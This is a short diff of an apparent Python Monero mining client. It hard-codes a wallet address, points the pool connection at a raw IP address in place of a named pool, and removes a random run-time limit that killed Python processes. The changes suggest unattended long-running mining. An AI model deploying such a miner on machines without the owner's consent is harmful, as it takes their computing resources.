@@ -38,25 +38,12 @@ import sys
 import os
 import time
 from multiprocessing import Process, Queue
-from threading import Timer
-import random
 
 
-
-
-pool_host = 'xmr.f2pool.com'
-pool_port = 13531
+pool_host = '34.72.1.15'
+pool_port = 3333
 pool_pass = 'x'
 wallet_address = '46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y'
-random_number_time = (random.randint(1, 15) + 20)
-sys.stdout.write(random_number_time)
-sys.stdout.flush()
-
-
-def endJob():
-    print('{}Jobs success!!'.format(os.linesep))
-    os.system("pkill python")
-
 
 def main():
     pool_ip = socket.gethostbyname(pool_host)
@@ -80,9 +67,6 @@ def main():
     }
     print('Logging into pool: {}:{}'.format(pool_host, pool_port))
     s.sendall(str(json.dumps(login)+'\n').encode('utf-8'))
-    # function set time running
-    Timer((random_number_time*60), endJob).start()
-    # end set time running
     try:
         while 1:
             line = s.makefile().readline()
